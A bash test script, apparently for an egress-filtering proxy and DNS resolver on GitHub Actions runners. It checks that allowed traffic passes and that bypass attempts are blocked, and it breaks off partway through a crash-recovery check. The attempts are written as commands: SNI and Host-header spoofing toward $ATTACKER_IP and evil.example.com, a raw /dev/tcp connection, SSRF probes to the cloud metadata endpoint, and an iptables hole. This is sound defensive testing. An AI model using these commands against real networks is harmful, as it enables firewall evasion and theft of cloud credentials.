#!/usr/bin/env bash
# safer-runner real-runner checks.
# usage: checks.sh <must-pass|must-fail|sudo-must-fail|ssrf|analyze|strict|privilege-removed|privilege-retained|crash-recovery|supply-chain|baseline|http-filter[-split[-audit]|-no-platform[-audit]|-analyze|-git-deny|-selftest|-invalid]>
set -u
cd "$(dirname "$0")/.."
source tests/lib.sh

must_pass() {
  local code issuer out
  record ctx.os INFO "$(. /etc/os-release; echo "$PRETTY_NAME") $(uname -r); $(sudo --version 2>/dev/null | head -1)"
  out=$(jq -c . /var/log/safer-runner/selftest.json 2>&1)
  jq -e 'length == 3 and all(.ok) and any(.name == "dns-exact")' /var/log/safer-runner/selftest.json >/dev/null 2>&1
  pass_if S.action-selftests $? "$out"

  for v in NODE_EXTRA_CA_CERTS NODE_USE_SYSTEM_CA REQUESTS_CA_BUNDLE PIP_CERT SSL_CERT_FILE GIT_SSL_CAINFO AWS_CA_BUNDLE CURL_CA_BUNDLE; do
    [ -n "${!v:-}" ] || { record A.env FAIL "$v not exported to later steps"; return; }
  done
  record A.env PASS "CA env vars exported via GITHUB_ENV (NODE_EXTRA_CA_CERTS=$NODE_EXTRA_CA_CERTS)"

  code=$(gh_zen -o /dev/null -w '%{http_code}' 2>&1)
  issuer=$(echo | timeout 15 openssl s_client -connect api.github.com:443 -servername api.github.com 2>/dev/null | openssl x509 -noout -issuer 2>/dev/null)
  [ "$code" = 200 ] && grep -q safer-runner <<<"$issuer"
  pass_if A.curl $? "https://api.github.com/zen -> $code, cert $issuer"

  rm -rf /tmp/hw
  out=$(git clone -q --depth 1 https://github.com/octocat/Hello-World.git /tmp/hw 2>&1)
  pass_if A.git-clone $? "${out:-cloned $(git -C /tmp/hw rev-parse --short HEAD 2>/dev/null)}"

  out=$(node -e 'fetch("https://github.com/robots.txt").then(r=>{console.log(r.status);process.exit(r.status==200?0:1)}).catch(e=>{console.log(String(e.cause||e));process.exit(1)})' 2>&1)
  pass_if A.node-fetch $? "node $(node --version): $out"

  out=$(python3 -c "import urllib.request as u;print(u.urlopen('https://github.com/robots.txt',timeout=20).status)" 2>&1)
  pass_if A.python-urllib $? "$(tail -1 <<<"$out")"

  rm -rf /tmp/venv
  out=$( { python3 -m venv /tmp/venv && /tmp/venv/bin/pip install -q requests && /tmp/venv/bin/python -c "import requests;print(requests.get('https://github.com/robots.txt',timeout=20).status_code)"; } 2>&1)
  pass_if A.pip-requests $? "pip install via PIP_CERT + requests via REQUESTS_CA_BUNDLE: $(tail -1 <<<"$out")"

  out=$(npm view left-pad version 2>&1)
  pass_if A.npm $? "npm view left-pad -> $(tail -1 <<<"$out")"

  mkdir -p /tmp/j && cat > /tmp/j/Main.java <<'J'
public class Main { public static void main(String[] a) throws Exception {
  var c = java.net.http.HttpClient.newHttpClient();
  var r = c.send(java.net.http.HttpRequest.newBuilder(java.net.URI.create("https://github.com/robots.txt")).build(),
                 java.net.http.HttpResponse.BodyHandlers.discarding());
  System.out.println(r.statusCode()); System.exit(r.statusCode() == 200 ? 0 : 1); } }
J
  out=$(timeout 120 java /tmp/j/Main.java 2>&1)
  pass_if A.java $? "java ($JAVA_HOME): $(tail -1 <<<"$out")"

  out=$(timeout 120 docker pull -q alpine:3.20 2>&1); record A.docker-pull INFO "rc=$? $(tail -1 <<<"$out" | cut -c1-160)"
  # ghcr: registry API on ghcr.io (exact) + blobs 307'd to pkg-containers.githubusercontent.com (exact): no *.ghcr.io
  out=$(timeout 120 docker pull -q ghcr.io/containerd/busybox:1.36 2>&1); rc=$?
  if docker info >/dev/null 2>&1; then pass_if A.ghcr-pull $rc "docker pull ghcr.io/containerd/busybox:1.36 -> $(tail -1 <<<"$out" | cut -c1-160)"
  else record A.ghcr-pull INFO "no docker access in this job: $(tail -1 <<<"$out" | cut -c1-120)"; fi

  dns_resolver

  # ~300 MiB of a GitHub release asset through the MITM (single stream, informational)
  out=$(curl -sS -L -m 120 -r 0-314572799 -o /dev/null -w '%{size_download} %{time_total}' \
    'https://github.com/llvm/llvm-project/releases/download/llvmorg-18.1.8/clang+llvm-18.1.8-x86_64-linux-gnu-ubuntu-18.04.tar.xz' 2>&1)
  record D.throughput-mitm INFO "$(awk '{ if ($2>0) printf "%.0f MiB in %.1fs = %.0f MiB/s", $1/1048576, $2, $1/1048576/$2; else print }' <<<"$out")"
}

must_fail() {
  local OBJ_IP GH_IP m out rc rec
  OBJ_IP=$(ip4 objects.githubusercontent.com); GH_IP=$(ip4 github.com)
  record ctx.ips INFO "objects.githubusercontent.com=$OBJ_IP github.com=$GH_IP attacker=$ATTACKER_IP"

  expect_blocked C3.resolve-cotenant "curl --resolve octocat.github.io:443:$OBJ_IP (shared GitHub Pages/objects IP)" \
    '.ev=="tls" and .sni=="octocat.github.io" and .layer=="sni" and .verdict=="BLOCK"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' --resolve "octocat.github.io:443:$OBJ_IP" https://octocat.github.io/
  expect_blocked C3.resolve-attacker-k "curl -k --resolve evil.example.com:443:$GH_IP" \
    '.ev=="tls" and .sni=="evil.example.com" and .layer=="sni" and .verdict=="BLOCK"' \
    curl -k -sS -m 15 -o /dev/null -w '%{http_code}' --resolve "evil.example.com:443:$GH_IP" https://evil.example.com/

  never_reached E.sni-spoof-repoint "allowed SNI pipelines.actions.githubusercontent.com dialled at attacker IP" "$ATTACKER_IP" \
    curl -k -sS -m 15 -o /dev/null -w '%{http_code}' --resolve "pipelines.actions.githubusercontent.com:443:$ATTACKER_IP" https://pipelines.actions.githubusercontent.com/
  never_reached F.http-host-spoof-repoint "plain HTTP Host: api.github.com dialled at attacker IP" "$ATTACKER_IP" \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' -H 'Host: api.github.com' "http://$ATTACKER_IP/"

  expect_blocked G.fronting-evil "https://github.com/ with Host: evil.example.com" \
    '.ev=="https" and .reason=="host-sni-mismatch" and .verdict=="BLOCK"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' -H 'Host: evil.example.com' https://github.com/
  expect_blocked G.fronting-allowed "https://github.com/ with Host: api.github.com (both allowed, Host!=SNI)" \
    '.ev=="https" and .reason=="host-sni-mismatch" and .host=="api.github.com"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' -H 'Host: api.github.com' https://github.com/

  expect_blocked I.ip-literal-tls "https://$ATTACKER_IP/" \
    ".ev==\"tls\" and .layer==\"sni\" and .verdict==\"BLOCK\" and (.dst|startswith(\"$ATTACKER_IP:\"))" \
    curl -k -sS -m 15 -o /dev/null -w '%{http_code}' "https://$ATTACKER_IP/"
  expect_blocked I.no-sni "openssl s_client -noservername to github.com ($GH_IP)" \
    '.ev=="tls" and .reason=="no-sni" and .verdict=="BLOCK"' \
    bash -c "openssl s_client -connect $GH_IP:443 -noservername </dev/null 2>&1 | grep -q 'BEGIN CERTIFICATE'"
  expect_blocked H.http-attacker-ip "http://$ATTACKER_IP/ (IP-literal Host)" \
    '.ev=="http" and .verdict=="BLOCK" and .reason=="ip-literal-host"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' "http://$ATTACKER_IP/"
  expect_blocked H.http-disallowed-host "http://example.org/ (resolved to attacker IP by the client)" \
    '.ev=="http" and .verdict=="BLOCK" and .host=="example.org"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' --resolve "example.org:80:$ATTACKER_IP" http://example.org/

  out=$(curl -sS -m 15 -o /dev/null https://example.org/ 2>&1); rc=$?
  [ $rc -ne 0 ]; pass_if D.dns-refused-https $? "https://example.org (not allowlisted) -> rc=$rc '${out: -80}'"

  out=$(timeout 8 bash -c "echo > /dev/tcp/$ATTACKER_IP/853" 2>&1); rc=$?
  [ $rc -ne 0 ]; pass_if B.non-http-port $? "tcp $ATTACKER_IP:853 (DoT) -> rc=$rc ${out: -60}"
  out=$(curl -6 -sS -m 8 -o /dev/null 'https://[2606:4700:4700::1111]/' 2>&1); rc=$?
  [ $rc -ne 0 ]; pass_if B.ipv6 $? "IPv6 literal -> rc=$rc ${out: -60}"

  for r in 168.63.129.16 8.8.8.8 127.0.0.53; do
    out=$(dig +short +time=3 +tries=1 "@$r" example.org A 2>&1)
    if grep -qE '^[0-9]+\.' <<<"$out"; then record "DNS.direct-$r" FAIL "dig @$r example.org -> $out"; else
      record "DNS.direct-$r" PASS "dig @$r example.org -> '${out:-<no answer>}' (answered by our resolver)"; fi
  done
  out=$(dig +short +time=3 +tries=1 @168.63.129.16 api.github.com A 2>&1)
  record DNS.allowed-via-azure INFO "dig @168.63.129.16 api.github.com -> $(tr '\n' ' ' <<<"$out")"
  grep -q ' BLOCK A example.org. ' /var/log/safer-runner/dns.log
  pass_if DNS.redirected-to-resolver $? "CoreDNS logged (BLOCK) the direct-IP queries for example.org"

  dns_exact

  rec=$(jq -c 'select(.ev=="tls" and .layer=="sni" and .verdict=="BLOCK")' "$FLOWLOG" | wc -l)
  [ "$rec" -gt 0 ]; pass_if S.sni-layer-block-fired $? "$rec SNI-layer BLOCK records (enforcement happened at the ClientHello, not only Host)"
}

# CoreDNS resolver on the real runner (the spike's NOT-VERIFIED items: non-root :53 bind via an
# ambient capability under systemd-run, StandardOutput=append log file + mode, coexistence with
# GitHub's 127.0.0.100 egress resolver, amd64)
dns_resolver() {
  local pid out caps
  record ctx.arch INFO "$(uname -m); listeners on :53: $(ss -Hlun 'sport = :53' | awk '{print $4}' | sort -u | tr '\n' ' ')"
  systemctl is-active -q safer-runner-dns; pass_if R.unit-active $? "safer-runner-dns: $(systemctl is-active safer-runner-dns) restarts=$(systemctl show -p NRestarts --value safer-runner-dns)"
  pid=$(systemctl show -p MainPID --value safer-runner-dns)
  out=$(ps -o user:32=,uid=,comm= -p "$pid" 2>&1)
  caps=$(awk '/^Cap(Eff|Prm|Bnd|Amb)/{printf "%s=%s ", $1, $2}' "/proc/$pid/status" 2>&1)
  [[ "$out" =~ ^dns-[0-9a-f]+\ +6[0-9]{4}\ +coredns$ ]] && grep -q 'CapEff:=0000000000000400' <<<"$caps"
  pass_if R.non-root-cap-bind $? "pid $pid: $out; $caps"
  ss -Hlun 'sport = :53' | grep -q '127.0.0.1:53'; pass_if R.bound-127.0.0.1 $? "$(ss -Hlun 'sport = :53' | awk '{print $4}' | tr '\n' ' ')"
  out=$(stat -c '%U:%G %a' /var/log/safer-runner/dns.log 2>&1)
  [ "$out" = "root:root 644" ] && grep -q ' ALLOW A github.com. ' /var/log/safer-runner/dns.log
  pass_if R.log-file $? "dns.log $out, readable without sudo; $(grep -m1 -o 'CoreDNS-[0-9.]*' /var/log/safer-runner/dns.log) $(grep -m1 -o 'linux/[a-z0-9]*' /var/log/safer-runner/dns.log)"
  # /etc/hosts names over DNS (hosts plugin), incl. the VM hostname even when /etc/hosts lacks it (AWS)
  out=$(dig +short +time=2 +tries=1 @127.0.0.1 "$(hostname)" A | head -1); local lh; lh=$(dig +short +time=2 +tries=1 @127.0.0.1 localhost A | head -1)
  [[ "$out" =~ ^[0-9.]+$ ]] && [ "$lh" = 127.0.0.1 ] && ! sudo -n true 2>&1 | grep -q 'unable to resolve host'
  pass_if R.local-names $? "dig $(hostname) -> ${out:-<none>}; localhost -> ${lh:-<none>}; in /etc/hosts: $(grep -cw "$(hostname)" /etc/hosts)"
  grep -q '^nameserver 127.0.0.1$' /etc/resolv.conf; pass_if R.resolv-conf $? "$(grep nameserver /etc/resolv.conf | tr '\n' ' ')"
  if ss -Hlun 'sport = :53' | grep -q '127.0.0.100:53'; then
    out=$(getent hosts github.com | head -1); [ -n "$out" ]
    pass_if R.coexists-127.0.0.100 $? "GitHub egress resolver present on 127.0.0.100:53 alongside ours; github.com -> $out"
  else
    record R.coexists-127.0.0.100 INFO "no 127.0.0.100 resolver on this VM"
  fi
  # wildcard entries resolve (.docker.io expands to docker.io + *.docker.io; meta's *.actions...)
  for n in registry-1.docker.io pipelines.actions.githubusercontent.com hosted-compute-watchdog-prod-iad-01.githubapp.com 1.1.1.1.nip.io docker.io; do
    out=$(getent ahostsv4 "$n" | awk '{print $1; exit}')
    [ -n "$out" ]; pass_if "R.wildcard-$n" $? "$n -> ${out:-<none>}"
  done
}

# exact-FQDN: a name under an exact entry is refused ON THE RUNNER (BLOCK block, never the ALLOW/
# forwarding block), for every query type and transport; the name never gets an upstream= line.
dns_exact() {
  local secret parent n out st
  secret="s$(head -c 10 /dev/urandom | od -An -tx1 | tr -d ' \n')"
  for parent in objects.githubusercontent.com pypi.org release-assets.githubusercontent.com; do
    n="$secret.$parent"
    for q in "A" "TXT" "AAAA +tcp"; do
      st=$(dig +time=3 +tries=1 $n $q 2>&1 | grep -o 'status: [A-Z]*')
      [ "$st" = "status: NXDOMAIN" ]; pass_if "X.exact-$parent-${q// /}" $? "dig $n $q -> $st"
    done
    sleep 0.5
    grep -q " BLOCK A $n. NXDOMAIN" /var/log/safer-runner/dns.log && ! grep -q "$n. .*upstream=" /var/log/safer-runner/dns.log
    pass_if "X.exact-$parent-not-forwarded" $? "$(grep -c "$n" /var/log/safer-runner/dns.log) BLOCK lines, $(grep -c "$n. .*upstream=" /var/log/safer-runner/dns.log) forwarded"
  done
  out=$(curl -sS -m 10 -o /dev/null -w '%{http_code}' https://www.pypi.org/ 2>&1); local rc=$?
  [ $rc -ne 0 ]; pass_if X.exact-user-entry-subdomain $? "https://www.pypi.org (only pypi.org listed) -> rc=$rc '${out: -60}'"
  out=$(curl -sS -m 10 -o /dev/null -w '%{http_code}' https://pypi.org/simple/ 2>&1)
  [[ "$out" =~ ^[23] ]]; pass_if X.exact-user-entry-apex $? "https://pypi.org/simple/ -> $out"
}

# Needs sudo: only meaningful in the advisory job (enforce + disable-sudo: false).
sudo_must_fail() {
  local m out rc rec t0 code
  # A hole punched in the REDIRECT must still be stopped by the filter REJECT (fail closed).
  m=$(mark)
  sudo iptables -t nat -I SAFER_RUNNER_NAT 1 -d "$ATTACKER_IP/32" -j RETURN
  out=$(curl -k -sS -m 8 -o /dev/null -w '%{http_code}' "https://$ATTACKER_IP/" 2>&1); rc=$?
  sudo iptables -t nat -D SAFER_RUNNER_NAT 1
  sleep 0.5; rec=$(flows_q "$m" "(.dst // \"\" | startswith(\"$ATTACKER_IP:\"))" | head -1)
  [ $rc -ne 0 ] && [ -z "$rec" ]
  pass_if B.fail-closed-hole $? "REDIRECT bypassed for $ATTACKER_IP (proxy never saw it) -> rc=$rc '${out: -80}'"

  # H1, addon layer via /etc/hosts (also covers ULA, which public wildcard DNS can't give us).
  # The client dials a public IP, so the only thing that can refuse is the proxy's IP guard.
  printf '169.254.169.254 imds-hosts.nip.io\n127.0.0.1 lo-hosts.nip.io\n10.0.0.1 rfc1918-hosts.nip.io\nfd00::1 ula-hosts.nip.io\n169.254.169.254 pt-hosts.sslip.io\n' | sudo tee -a /etc/hosts >/dev/null
  local n ip
  for pair in imds-hosts:169.254.169.254 lo-hosts:127.0.0.1 rfc1918-hosts:10.0.0.1; do
    n="${pair%%:*}.nip.io"; ip="${pair#*:}"
    expect_upstream_refused "H1.guard-http-$ip" "proxy resolves $n -> $ip (/etc/hosts); plain HTTP dialled at $ATTACKER_IP" "$ip" \
      ".ev==\"upstream\" and .host==\"$n\" and .verdict==\"BLOCK\" and .reason==\"upstream-ip-forbidden\"" \
      curl -sS -m 10 -o /dev/null -w '%{http_code}' -H 'Metadata: true' --resolve "$n:80:$ATTACKER_IP" "http://$n/metadata/instance?api-version=2021-02-01"
    expect_upstream_refused "H1.guard-https-$ip" "proxy resolves $n -> $ip (/etc/hosts); HTTPS (intercept) dialled at $ATTACKER_IP" "$ip" \
      ".ev==\"upstream\" and .host==\"$n\" and .verdict==\"BLOCK\"" \
      curl -k -sS -m 10 -o /dev/null -w '%{http_code}' --resolve "$n:443:$ATTACKER_IP" "https://$n/"
  done
  expect_upstream_refused "H1.guard-passthrough-imds" "proxy resolves passthrough name pt-hosts.sslip.io -> 169.254.169.254 (/etc/hosts)" 169.254.169.254 \
    '.ev=="upstream" and .host=="pt-hosts.sslip.io" and .verdict=="BLOCK" and .reason=="upstream-ip-forbidden"' \
    curl -k -sS -m 10 -o /dev/null -w '%{http_code}' --resolve "pt-hosts.sslip.io:443:$ATTACKER_IP" https://pt-hosts.sslip.io/
  expect_upstream_refused "H1.guard-ula" "proxy resolves ula-hosts.nip.io -> fd00::1 (/etc/hosts)" "" \
    '.ev=="upstream" and .host=="ula-hosts.nip.io" and .verdict=="BLOCK" and .reason=="upstream-ip-forbidden"' \
    curl -sS -m 10 -o /dev/null -w '%{http_code}' --resolve "ula-hosts.nip.io:80:$ATTACKER_IP" http://ula-hosts.nip.io/
  sudo sed -i '/-hosts\.\(nip\|sslip\)\.io$/d' /etc/hosts

  # Proxy crash: systemd restarts it (same CA from tmpfs) and traffic recovers (GA gate preview)
  sudo systemctl kill -s KILL safer-runner-proxy
  t0=$(date +%s.%N)
  for _ in $(seq 1 30); do
    code=$(gh_zen -m 5 -o /dev/null -w '%{http_code}' 2>/dev/null) && [ "$code" = 200 ] && break
    sleep 0.5
  done
  record X.proxy-kill-recovery INFO "SIGKILL -> api.github.com $code after $(awk -v a="$t0" -v b="$(date +%s.%N)" 'BEGIN{printf "%.1f", b-a}')s; restarts=$(systemctl show -p NRestarts --value safer-runner-proxy)"

  # exact-FQDN on the wire: a name under an exact entry never leaves the VM; a name under a
  # wildcard entry does (the control proves the capture works - wildcards stay a DNS channel)
  local secret ctl pcap=/tmp/dns-wire.pcap
  secret="w$(head -c 10 /dev/urandom | od -An -tx1 | tr -d ' \n')"; ctl="c$RANDOM$RANDOM.github.com"
  sudo timeout 12 tcpdump -i any -nn -U -s 0 -w "$pcap" 'port 53 and not net 127.0.0.0/8' 2>/dev/null &
  sleep 2
  dig +time=2 +tries=1 "$secret.objects.githubusercontent.com" A >/dev/null 2>&1
  dig +time=2 +tries=1 +tcp "$secret.pypi.org" TXT >/dev/null 2>&1
  dig +time=2 +tries=1 "$ctl" A >/dev/null 2>&1
  wait
  out=$(sudo tcpdump -nn -r "$pcap" 2>/dev/null)
  ! grep -q "$secret" <<<"$out" && grep -q "${ctl%%.*}" <<<"$out"
  pass_if X.exact-not-on-wire $? "pcap ($(wc -l <<<"$out") pkts off-host :53): secret seen $(grep -c "$secret" <<<"$out")x, wildcard control seen $(grep -c "${ctl%%.*}" <<<"$out")x"

  # resolver crash: systemd restarts it and resolution recovers
  sudo systemctl kill -s KILL safer-runner-dns
  t0=$(date +%s.%N); out=""
  for _ in $(seq 1 30); do
    out=$(dig +short +time=1 +tries=1 github.com A 2>/dev/null | grep -E '^[0-9]+(\.[0-9]+){3}$' | head -1); [ -n "$out" ] && break
    sleep 0.5
  done
  [ -n "$out" ]
  pass_if X.dns-kill-recovery $? "SIGKILL CoreDNS -> github.com $out after $(awk -v a="$t0" -v b="$(date +%s.%N)" 'BEGIN{printf "%.1f", b-a}')s; restarts=$(systemctl show -p NRestarts --value safer-runner-dns)"
}

# H1: allowlisted names (nip.io / sslip.io are allowlisted in these jobs) that resolve to
# internal addresses must never be reached through the proxy.
ssrf() {
  local out n
  # No DNS-layer rebind drop any more (CoreDNS replaced dnsmasq): internal answers are returned
  # as-is and the PROXY's upstream IP guard refuses them, logging the address.
  for n in 169.254.169.254.nip.io 127.0.0.1.nip.io 10.0.0.1.nip.io 100.64.0.1.nip.io; do
    out=$(dig +short +time=3 +tries=2 @127.0.0.1 "$n" A 2>&1)
    record "H1.dns-answer-$n" INFO "dig $n -> '${out:-<no answer>}' (no DNS-layer rebind drop, by design)"
  done
  out=$(dig +short +time=3 +tries=2 @127.0.0.1 1.1.1.1.nip.io A 2>&1)
  [ "$out" = 1.1.1.1 ]; pass_if H1.dns-public-still-resolves $? "dig 1.1.1.1.nip.io -> $out"

  # IMDS by an allowlisted name, dialled directly: 169.254.169.254:80 is exempt from the REDIRECT
  # (the platform needs it), so this reaches IMDS exactly like the IP literal does. Informational.
  out=$(curl -sS -m 10 -o /dev/null -w '%{http_code}' -H 'Metadata: true' 'http://169.254.169.254.nip.io/metadata/instance?api-version=2021-02-01' 2>&1); local rc=$?
  record H1.imds-by-name INFO "http://169.254.169.254.nip.io/metadata/instance -> rc=$rc HTTP $out (same reachability as http://169.254.169.254/, by design)"

  # through the proxy: the IP guard refuses and logs the internal address it resolved
  expect_upstream_refused H1.proxy-imds-http "Host 169.254.169.254.nip.io dialled at $ATTACKER_IP (plain HTTP)" 169.254.169.254 \
    '.ev=="upstream" and .host=="169.254.169.254.nip.io" and .verdict=="BLOCK" and .reason=="upstream-ip-forbidden" and ((.resolved // []) | tostring | contains("169.254.169.254"))' \
    curl -sS -m 10 -o /dev/null -w '%{http_code}' -H 'Metadata: true' --resolve "169.254.169.254.nip.io:80:$ATTACKER_IP" 'http://169.254.169.254.nip.io/metadata/instance?api-version=2021-02-01'
  expect_upstream_refused H1.proxy-loopback-https "SNI 127.0.0.1.nip.io dialled at $ATTACKER_IP (intercept)" 127.0.0.1 \
    '.ev=="upstream" and .host=="127.0.0.1.nip.io" and .verdict=="BLOCK" and .reason=="upstream-ip-forbidden" and ((.resolved // []) | tostring | contains("127.0.0.1"))' \
    curl -k -sS -m 10 -o /dev/null -w '%{http_code}' --resolve "127.0.0.1.nip.io:443:$ATTACKER_IP" https://127.0.0.1.nip.io/
  expect_upstream_refused H1.proxy-rfc1918-http "Host 10.0.0.1.nip.io dialled at $ATTACKER_IP" 10.0.0.1 \
    '.ev=="upstream" and .host=="10.0.0.1.nip.io" and .verdict=="BLOCK" and .reason=="upstream-ip-forbidden" and ((.resolved // []) | tostring | contains("10.0.0.1"))' \
    curl -sS -m 10 -o /dev/null -w '%{http_code}' --resolve "10.0.0.1.nip.io:80:$ATTACKER_IP" http://10.0.0.1.nip.io/

  # CGNAT (dnsmasq 2.91 used to pass it, 2.92 dropped it): now always the proxy's IP guard
  expect_upstream_refused H1.guard-cgnat-http "Host 100.64.0.1.nip.io dialled at $ATTACKER_IP (plain HTTP)" 100.64.0.1 \
    '.ev=="upstream" and .host=="100.64.0.1.nip.io" and .verdict=="BLOCK"' \
    curl -sS -m 10 -o /dev/null -w '%{http_code}' --resolve "100.64.0.1.nip.io:80:$ATTACKER_IP" http://100.64.0.1.nip.io/
  expect_upstream_refused H1.guard-cgnat-https "SNI 100.64.0.1.nip.io dialled at $ATTACKER_IP (intercept)" 100.64.0.1 \
    '.ev=="upstream" and .host=="100.64.0.1.nip.io" and .verdict=="BLOCK"' \
    curl -k -sS -m 10 -o /dev/null -w '%{http_code}' --resolve "100.64.0.1.nip.io:443:$ATTACKER_IP" https://100.64.0.1.nip.io/
  # passthrough connections get the same guard (100-64-0-1.sslip.io is a passthrough-domain here)
  expect_upstream_refused H1.guard-cgnat-passthrough "SNI 100-64-0-1.sslip.io dialled at $ATTACKER_IP (passthrough, SNI only)" 100.64.0.1 \
    '.ev=="upstream" and .host=="100-64-0-1.sslip.io" and .verdict=="BLOCK"' \
    curl -k -sS -m 10 -o /dev/null -w '%{http_code}' --resolve "100-64-0-1.sslip.io:443:$ATTACKER_IP" https://100-64-0-1.sslip.io/

  # legitimate: a public answer under the same allowlisted suffix is connected to (and pinned)
  local m rec; m=$(mark)
  out=$(curl -sS -m 15 -o /dev/null -w '%{http_code}' http://1.1.1.1.nip.io/ 2>&1)
  sleep 0.5; rec=$(flows_q "$m" '.ev=="server-connect" and (.peername // "" | startswith("1.1.1.1:")) and (.address // "" | startswith("1.1.1.1.nip.io:"))' | head -1)
  [ -n "$rec" ]; pass_if H1.public-name-connects $? "http://1.1.1.1.nip.io/ -> $out; $rec"
}

# H2: the privilege state the job ended up with
privilege() { # privilege <expect-sudo: yes|no>
  local out rc retained
  retained=$(jq -r '.sudoRetained' /etc/safer-runner/setup-complete 2>&1)
  if [ "$1" = no ]; then
    out=$(sudo -n true 2>&1); rc=$?
    [ $rc -ne 0 ]; pass_if H2.sudo-removed $? "sudo -n true -> rc=$rc ${out: -100}"
    [ "$retained" = false ]; pass_if H2.marker-not-advisory $? "setup-complete sudoRetained=$retained"
    # the runner user can't stop the proxy unit (polkit) or signal it (other uid)
    out=$(systemctl stop safer-runner-proxy 2>&1 </dev/null); rc=$?
    [ $rc -ne 0 ] && systemctl is-active -q safer-runner-proxy
    pass_if H2.unit-stop-denied $? "systemctl stop (no sudo) -> rc=$rc '${out: -80}'; unit $(systemctl is-active safer-runner-proxy)"
    out=$(kill -9 "$(systemctl show -p MainPID --value safer-runner-proxy)" 2>&1); rc=$?
    [ $rc -ne 0 ] && systemctl is-active -q safer-runner-proxy
    pass_if H2.proxy-kill-denied $? "kill -9 <proxy pid> -> rc=$rc '${out: -80}'"
    out=$(gh_zen -o /dev/null -w '%{http_code}' 2>&1)
    [ "$out" = 200 ]; pass_if H2.proxy-still-up $? "api.github.com -> $out"
  else
    out=$(sudo -n true 2>&1); rc=$?
    [ $rc -eq 0 ]; pass_if H2.sudo-retained $? "sudo -n true -> rc=$rc (explicit disable-sudo: false)"
    [ "$retained" = true ]; pass_if H2.marker-advisory $? "setup-complete sudoRetained=$retained (summary header says ADVISORY)"
  fi
}

# M1: the integrity baseline is root-owned and out of the runner's reach
baseline() {
  local f=/etc/safer-runner/validation-state.json out rc
  out=$(stat -c '%U:%G %a' "$f" 2>&1)  # stat needs only search permission on the (0755) directory
  [ "$out" = "root:root 600" ]; pass_if M1.baseline-root-0600 $? "$f -> $out"
  [ ! -e /tmp/safer-runner-validation-state.json ]; pass_if M1.no-tmp-baseline $? "/tmp/safer-runner-validation-state.json absent"
  out=$( (echo '{}' > "$f") 2>&1); rc=$?
  [ $rc -ne 0 ]; pass_if M1.runner-cannot-write $? "runner write -> rc=$rc ${out: -80}"
  out=$(cat "$f" 2>&1); rc=$?
  [ $rc -ne 0 ]; pass_if M1.runner-cannot-read $? "runner cat -> rc=$rc ${out: -80}"
  # stderr dropped: sudo warns 'unable to resolve host' on AWS-hosted VMs (hostname not in /etc/hosts)
  out=$(sudo -n cat "$f" 2>/dev/null | jq -r '.files | length' 2>&1)
  [[ "$out" =~ ^[1-9][0-9]*$ ]]; pass_if M1.validation-read-allowed $? "sudo -n cat (exact allowlist entry) -> $out files in baseline"
}

analyze() {
  local out rc m rec
  m=$(mark)
  out=$(curl -sS -m 20 -o /dev/null -w '%{http_code}' https://example.org/ 2>&1)
  sleep 0.5; rec=$(flows_q "$m" '.ev=="tls" and .sni=="example.org" and .verdict=="WOULD_BLOCK" and .passthrough==true' | head -1)
  [ "$out" = 200 ] && [ -n "$rec" ]
  pass_if Z.not-allowlisted-works $? "https://example.org -> $out (passed through by SNI, logged WOULD_BLOCK): $rec"
  m=$(mark)
  out=$(curl -sS -m 20 -o /dev/null -w '%{http_code}' -H 'Host: api.github.com' https://github.com/ 2>&1)
  sleep 0.5; rec=$(flows_q "$m" '.ev=="https" and .reason=="host-sni-mismatch" and .verdict=="WOULD_BLOCK"' | head -1)
  [ -n "$rec" ]; pass_if Z.fronting-logged $? "fronting in analyze -> $out, logged: $rec"
  out=$(dig +short +time=3 +tries=1 @8.8.8.8 example.org A 2>&1)
  grep -q ' WOULD_BLOCK A example.org. ' /var/log/safer-runner/dns.log
  pass_if Z.dns-redirected $? "dig @8.8.8.8 answered via CoreDNS, labelled WOULD_BLOCK: $(tr '\n' ' ' <<<"$out")"
  out=$(dig +short +time=3 +tries=1 "srst$RANDOM.objects.githubusercontent.com" A 2>&1)
  grep -q ' WOULD_BLOCK A srst[0-9]*.objects.githubusercontent.com. ' /var/log/safer-runner/dns.log
  pass_if Z.dns-exact-would-block $? "subdomain of an exact entry is labelled WOULD_BLOCK in analyze (still forwarded)"
  # H1 in analyze: the upstream IP guard logs WOULD_BLOCK (monitoring only), it does not refuse
  m=$(mark)
  out=$(curl -sS -m 5 -o /dev/null -w '%{http_code}' http://100.64.0.1.nip.io/ 2>&1)
  sleep 0.5; rec=$(flows_q "$m" '.ev=="upstream" and .host=="100.64.0.1.nip.io" and .verdict=="WOULD_BLOCK" and .reason=="upstream-ip-forbidden"' | head -1)
  [ -n "$rec" ]; pass_if Z.upstream-guard-logged $? "http://100.64.0.1.nip.io/ -> '${out: -40}', logged: $rec"
  out=$(sudo -n true 2>&1); [ $? -eq 0 ]; pass_if Z.analyze-keeps-sudo $? "sudo -n true in analyze (default disable-sudo off)"
}

strict() {
  local out
  out=$(sudo -n true 2>&1); [ $? -ne 0 ]
  pass_if P.sudo-disabled $? "sudo -n true -> ${out: -100}"
  privilege no
  baseline
  out=$(docker ps 2>&1); [ $? -ne 0 ]
  pass_if P.docker-disabled $? "docker ps -> ${out: -100}"
  out=$(gh_zen -o /dev/null -w '%{http_code}' 2>&1)
  [ "$out" = 200 ]; pass_if A.curl $? "api.github.com -> $out"
  local OBJ_IP; OBJ_IP=$(ip4 objects.githubusercontent.com)
  expect_blocked C3.resolve-cotenant "curl --resolve octocat.github.io:443:$OBJ_IP" \
    '.ev=="tls" and .sni=="octocat.github.io" and .verdict=="BLOCK"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' --resolve "octocat.github.io:443:$OBJ_IP" https://octocat.github.io/
}

privilege_removed() { privilege no; }
privilege_retained() { privilege yes; }

# T9 crash-recovery: SIGKILL the proxy and the resolver, prove systemd brings each back, the
# public CA is reused (so trust set up at boot still holds), egress recovers, and enforcement
# (proxy SNI allowlist + CoreDNS default-deny) is intact afterwards. Needs sudo -> advisory job.
crash_recovery() {
  local CA=/etc/safer-runner/ca.pem
  local before after code issuer out m rec
  local p_r0 p_pid0 p_pid1 d_r0 d_pid0 d_pid1
  wait_active() { local u=$1 t=${2:-30} i=0; while [ "$i" -lt "$t" ]; do systemctl is-active -q "$u" && return 0; sleep 1; i=$((i+1)); done; return 1; }
  # systemd says "active" before mitmproxy has bound its listeners; the addon's start record
